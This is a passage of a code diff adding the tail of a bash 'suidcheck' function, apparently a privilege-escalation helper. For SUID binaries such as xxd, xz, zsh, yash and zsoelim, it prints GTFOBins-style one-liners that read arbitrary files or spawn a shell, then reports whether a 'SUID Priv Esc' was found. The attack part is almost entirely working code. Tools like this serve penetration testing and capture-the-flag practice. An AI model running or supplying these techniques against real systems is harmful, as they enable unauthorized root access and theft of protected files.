+                    echo LFILE=file_to_read
+                    echo ./xmore $LFILE
+                    found_flag=1
+                    ;;
+                "xxd")
+                    echo LFILE=file_to_read
+                    echo ./xxd "$LFILE" | xxd -r
+                    found_flag=1
+                    ;;
+                "xz")
+                    echo LFILE=file_to_read
+                    echo ./xz -c "$LFILE" | xz -d
+                    found_flag=1
+                    ;;
+                "yash")
+                    echo ./yash
+                    found_flag=1
+                    ;;
+                "zsh")
+                    echo ./zsh
+                    found_flag=1
+                    ;;
+                "zsoelim")
+                    echo LFILE=file_to_read
+                    echo ./zsoelim "$LFILE"
+                    found_flag=1
+                    ;;
+            esac
+        fi
+    done
+
+    # Since found_flag is not accessible here, we have to handle it differently
+    if [ "$found_flag" -eq 0 ]; then
+        echo "No SUID Priv Esc Found"
+    else
+        echo "SUID Priv Esc Found"
+    fi
+}
+
+suidcheck
